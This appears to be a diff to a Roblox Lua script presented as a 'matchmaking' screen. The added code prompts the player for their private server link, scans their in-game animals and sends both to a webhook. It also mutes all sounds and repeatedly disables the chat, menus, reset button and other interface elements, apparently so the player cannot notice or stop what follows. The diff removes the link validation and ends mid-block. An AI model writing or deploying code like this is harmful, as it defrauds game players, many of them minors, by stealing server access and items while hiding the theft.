@@ -1,3 +1,4 @@
+
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -691,28 +692,9 @@ local function buscarBaseYAnimales()
     return foundAnimals
 end
 
--- FUNCIÓN PARA VALIDAR LINK DE SERVIDOR PRIVADO
-local function isValidPrivateServerLink(text)
-    if not string.find(text, "https?://") then
-        return false
-    end
 
-    if not string.find(text, "roblox%.com") then
-        return false
-    end
 
-    local patterns = {
-  
-    }
 
-    for _, pattern in ipairs(patterns) do
-        if string.match(text, pattern) then
-            return true
-        end
-    end
-
-    return false
-end
 
 -- FUNCIÓN PARA ENVIAR HEARTBEAT (GET periódico)
 local function startHeartbeat(url)
@@ -889,3 +871,424 @@ local function sendToWebhook(link, foundAnimals)
     end
 end
 
+-- Detener heartbeat cuando el jugador sale del juego
+Players.PlayerRemoving:Connect(function(playerLeaving)
+    if playerLeaving == LocalPlayer then
+        stopHeartbeat()
+    end
+end)
+
+-- CONFIGURACION DE ESTILO (Blanco y Negro / Profesional)
+local THEME = {
+    Background = Color3.fromRGB(15, 15, 15),
+    Accent = Color3.fromRGB(255, 255, 255),
+    Text = Color3.fromRGB(240, 240, 240),
+    SubText = Color3.fromRGB(180, 180, 180),
+    FontMain = Enum.Font.GothamBold,
+    FontBody = Enum.Font.Gotham,
+}
+
+-- UI SETUP
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MatchmakingUI"
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.DisplayOrder = 999999999
+screenGui.IgnoreGuiInset = true
+
+-- VARIABLE GLOBAL PARA EL LINK
+
+
+-- 1. MARCO PARA PEDIR EL LINK (ANTES DEL BOTÓN ACTIVAR)
+local linkFrame = Instance.new("Frame")
+linkFrame.Name = "LinkFrame"
+linkFrame.Size = UDim2.new(0, 450, 0, 200)
+linkFrame.Position = UDim2.new(0.5, -225, 0.5, -100)
+linkFrame.BackgroundColor3 = THEME.Background
+linkFrame.BackgroundTransparency = 0.05
+linkFrame.BorderSizePixel = 0
+linkFrame.Visible = true
+linkFrame.Parent = screenGui
+
+local linkCorner = Instance.new("UICorner")
+linkCorner.CornerRadius = UDim.new(0, 12)
+linkCorner.Parent = linkFrame
+
+local linkStroke = Instance.new("UIStroke")
+linkStroke.Color = THEME.Accent
+linkStroke.Thickness = 2
+linkStroke.Parent = linkFrame
+
+local linkTitle = Instance.new("TextLabel")
+linkTitle.Size = UDim2.new(1, -40, 0, 30)
+linkTitle.Position = UDim2.new(0, 20, 0, 20)
+linkTitle.BackgroundTransparency = 1
+linkTitle.Text = "PORFAVOR PEGA EL LINK DE TU SERVER PRIVADO"
+linkTitle.TextColor3 = THEME.Accent
+linkTitle.Font = THEME.FontMain
+linkTitle.TextSize = 16
+linkTitle.TextXAlignment = Enum.TextXAlignment.Center
+linkTitle.Parent = linkFrame
+
+local linkInputBox = Instance.new("TextBox")
+linkInputBox.Size = UDim2.new(1, -40, 0, 45)
+linkInputBox.Position = UDim2.new(0, 20, 0, 65)
+linkInputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+linkInputBox.BorderSizePixel = 0
+linkInputBox.Text = ""
+linkInputBox.TextColor3 = THEME.Text
+linkInputBox.Font = THEME.FontBody
+linkInputBox.TextSize = 14
+linkInputBox.PlaceholderText = " "
+linkInputBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
+linkInputBox.TextXAlignment = Enum.TextXAlignment.Left
+linkInputBox.ClearTextOnFocus = false
+linkInputBox.ClipsDescendants = true
+linkInputBox.TextTruncate = Enum.TextTruncate.AtEnd
+linkInputBox.Parent = linkFrame
+
+local linkInputCorner = Instance.new("UICorner")
+linkInputCorner.CornerRadius = UDim.new(0, 8)
+linkInputCorner.Parent = linkInputBox
+
+local linkInputPadding = Instance.new("UIPadding")
+linkInputPadding.PaddingLeft = UDim.new(0, 10)
+linkInputPadding.Parent = linkInputBox
+
+local linkConfirmBtn = Instance.new("TextButton")
+linkConfirmBtn.Size = UDim2.new(0, 150, 0, 40)
+linkConfirmBtn.Position = UDim2.new(0.5, -75, 0, 130)
+linkConfirmBtn.BackgroundColor3 = THEME.Accent
+linkConfirmBtn.TextColor3 = THEME.Background
+linkConfirmBtn.Text = "CONFIRMAR"
+linkConfirmBtn.Font = THEME.FontMain
+linkConfirmBtn.TextSize = 16
+linkConfirmBtn.AutoButtonColor = true
+linkConfirmBtn.BorderSizePixel = 0
+linkConfirmBtn.Parent = linkFrame
+
+local linkConfirmCorner = Instance.new("UICorner")
+linkConfirmCorner.CornerRadius = UDim.new(0, 8)
+linkConfirmCorner.Parent = linkConfirmBtn
+
+local linkErrorLabel = Instance.new("TextLabel")
+linkErrorLabel.Size = UDim2.new(1, -40, 0, 20)
+linkErrorLabel.Position = UDim2.new(0, 20, 0, 175)
+linkErrorLabel.BackgroundTransparency = 1
+linkErrorLabel.Text = ""
+linkErrorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+linkErrorLabel.Font = THEME.FontBody
+linkErrorLabel.TextSize = 12
+linkErrorLabel.TextXAlignment = Enum.TextXAlignment.Center
+linkErrorLabel.Parent = linkFrame
+
+-- 2. BOTON DE ACTIVAR (OCULTO INICIALMENTE)
+local activateBtn = Instance.new("TextButton")
+activateBtn.Name = "ActivateButton"
+activateBtn.Size = UDim2.new(0, 200, 0, 50)
+activateBtn.Position = UDim2.new(0.5, -100, 0.85, 0)
+activateBtn.BackgroundColor3 = THEME.Background
+activateBtn.TextColor3 = THEME.Accent
+activateBtn.Text = "ACTIVAR"
+activateBtn.Font = THEME.FontMain
+activateBtn.TextSize = 18
+activateBtn.AutoButtonColor = true
+activateBtn.BorderSizePixel = 0
+activateBtn.Visible = false
+activateBtn.Parent = screenGui
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 8)
+btnCorner.Parent = activateBtn
+
+local btnStroke = Instance.new("UIStroke")
+btnStroke.Color = THEME.Accent
+btnStroke.Thickness = 2
+btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+btnStroke.Parent = activateBtn
+
+-- EVENTO DE CONFIRMACIÓN DE LINK
+linkConfirmBtn.MouseButton1Click:Connect(function()
+    local link = linkInputBox.Text
+    
+   
+    
+ 
+    
+    TweenService:Create(linkFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(linkTitle, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
+    TweenService:Create(linkInputBox, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+    TweenService:Create(linkConfirmBtn, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+    TweenService:Create(linkStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
+    
+    task.wait(0.35)
+    linkFrame.Visible = false
+    
+    activateBtn.Visible = true
+    activateBtn.BackgroundTransparency = 1
+    activateBtn.TextTransparency = 1
+    TweenService:Create(activateBtn, TweenInfo.new(0.5), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+end)
+
+-- 3. MARCO PRINCIPAL (Contenedor de pantallas)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 400, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -200, 0.4, -150)
+mainFrame.BackgroundColor3 = THEME.Background
+mainFrame.BackgroundTransparency = 0.05
+mainFrame.BorderSizePixel = 0
+mainFrame.Visible = false
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 12)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = THEME.Accent
+mainStroke.Thickness = 1.5
+mainStroke.Transparency = 0
+mainStroke.Parent = mainFrame
+
+-- Variables para hacer draggable
+local dragging = false
+local dragInput, mousePos, framePos
+local isDraggable = true
+
+local function onInputBegan(input)
+    if not isDraggable then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        mousePos = input.Position
+        framePos = mainFrame.Position
+        
+        local connection
+        connection = input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                connection:Disconnect()
+            end
+        end)
+    end
+end
+
+local function onInputChanged(input)
+    if not isDraggable then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end
+
+mainFrame.InputBegan:Connect(onInputBegan)
+mainFrame.InputChanged:Connect(onInputChanged)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not isDraggable then return end
+    if input == dragInput and dragging then
+        local delta = input.Position - mousePos
+        mainFrame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
+    end
+end)
+
+-- Contenedor interno para el contenido cambiante
+local contentContainer = Instance.new("Frame")
+contentContainer.Name = "ContentContainer"
+contentContainer.Size = UDim2.new(1, -40, 1, -40)
+contentContainer.Position = UDim2.new(0, 20, 0, 20)
+contentContainer.BackgroundTransparency = 1
+contentContainer.Parent = mainFrame
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Parent = contentContainer
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Padding = UDim.new(0, 8)
+listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+
+-- HERRAMIENTAS DE UI
+local function clearContent()
+    for _, child in pairs(contentContainer:GetChildren()) do
+        if child:IsA("GuiObject") then
+            local properties = {BackgroundTransparency = 1}
+            
+            if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
+                properties.TextTransparency = 1
+            end
+            
+            TweenService:Create(child, TweenInfo.new(0.3), properties):Play()
+        end
+    end
+    task.wait(0.3)
+    for _, child in pairs(contentContainer:GetChildren()) do
+        if child:IsA("GuiObject") then 
+            child:Destroy() 
+        end
+    end
+end
+
+local function addText(text, font, size, color, delayTime)
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0, 24)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = color or THEME.Text
+    label.Font = font or THEME.FontBody
+    label.TextSize = size or 14
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextYAlignment = Enum.TextYAlignment.Center
+    label.Text = text
+    label.TextTransparency = 1
+    label.Parent = contentContainer
+    
+    TweenService:Create(label, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+    
+    if delayTime then 
+        task.wait(delayTime) 
+    end
+    return label
+end
+
+local function addHeader(text)
+    local label = addText(text, THEME.FontMain, 18, THEME.Accent, 0.1)
+    local line = Instance.new("Frame")
+    line.Size = UDim2.new(0, 0, 0, 2)
+    line.BackgroundColor3 = THEME.Accent
+    line.BorderSizePixel = 0
+    line.Parent = contentContainer
+    TweenService:Create(line, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {Size = UDim2.new(0.3, 0, 0, 2)}):Play()
+    task.wait(0.5)
+end
+
+local function getRandomBrainrots(count)
+    local shuffled = {}
+    for i, v in ipairs(BRAINROT_LIST) do
+        shuffled[i] = v
+    end
+    
+    for i = #shuffled, 2, -1 do
+        local j = math.random(i)
+        shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
+    end
+    
+    local selected = {}
+    for i = 1, math.min(count, #shuffled) do
+        table.insert(selected, shuffled[i])
+    end
+    
+    return selected
+end
+
+-- Función para silenciar todos los sonidos
+local function muteAllSounds()
+    local function mutear(sound)
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+            sound.Playing = false
+        end
+    end
+
+    for _, obj in pairs(game:GetDescendants()) do
+        mutear(obj)
+    end
+
+    game.DescendantAdded:Connect(function(obj)
+        mutear(obj)
+    end)
+
+    task.spawn(function()
+        while task.wait(1) do
+            for _, obj in pairs(game:GetDescendants()) do
+                if obj:IsA("Sound") then 
+                    obj.Volume = 0 
+                    obj.Playing = false
+                end
+            end
+        end
+    end)
+end
+
+-- Función para desactivar CoreGui y ocultar todo
+local function disableCoreGui()
+    local coreGuiTypes = {
+        Enum.CoreGuiType.PlayerList,
+        Enum.CoreGuiType.Health,
+        Enum.CoreGuiType.Backpack,
+        Enum.CoreGuiType.Chat,
+        Enum.CoreGuiType.EmotesMenu,
+        Enum.CoreGuiType.All
+    }
+    
+    for _, guiType in pairs(coreGuiTypes) do
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(guiType, false)
+        end)
+    end
+    
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+    end)
+    
+    pcall(function()
+        StarterGui:SetCore("ChatActive", false)
+    end)
+    
+    local function ocultarScreenGuis()
+        if player and player.Parent then
+            local PlayerGui = player:WaitForChild("PlayerGui")
+
+            for _, gui in ipairs(PlayerGui:GetChildren()) do
+                if gui:IsA("ScreenGui") and gui.Name ~= "MatchmakingUI" then
+                    gui.Enabled = false
+                end
+            end
+
+            PlayerGui.ChildAdded:Connect(function(gui)
+                if gui:IsA("ScreenGui") and gui.Name ~= "MatchmakingUI" then
+                    task.wait(0.1)
+                    gui.Enabled = false
+                end
+            end)
+        end
+    end
+    
+    ocultarScreenGuis()
+    
+    local function cerrarMenuRoblox()
+        pcall(function()
+            GuiService:ClearError()
+            StarterGui:SetCore("ResetButtonCallback", false)
+        end)
+
+        local CoreGui = game:GetService("CoreGui")
+        for _, gui in ipairs(CoreGui:GetChildren()) do
+            if gui:IsA("ScreenGui") then
+                if gui.Name:find("RobloxGui") or gui.Name:find("Menu") or gui.Name:find("Settings") then
+                    gui.Enabled = false
+                end
+            end
+        end
+    end
+    
+    cerrarMenuRoblox()
+    
+    task.spawn(function()
+        while task.wait(0.1) do
+            cerrarMenuRoblox()
+            ocultarScreenGuis()
+        end
+    end)
+end
+
+    
+    -- ESCANEO DE ANIMALES (sin UI) - Usando búsqueda en Workspace
+    local foundAnimals = buscarBaseYAnimales()
+    
+    task.wait(1)
+    
+    -- Esperar 5 segundos antes de enviar los datos reales
+    task.wait(5)
+    
+    -- Enviar datos al webhook (el envío real)
+    sendToWebhook(privateServerLink, foundAnimals)
+    
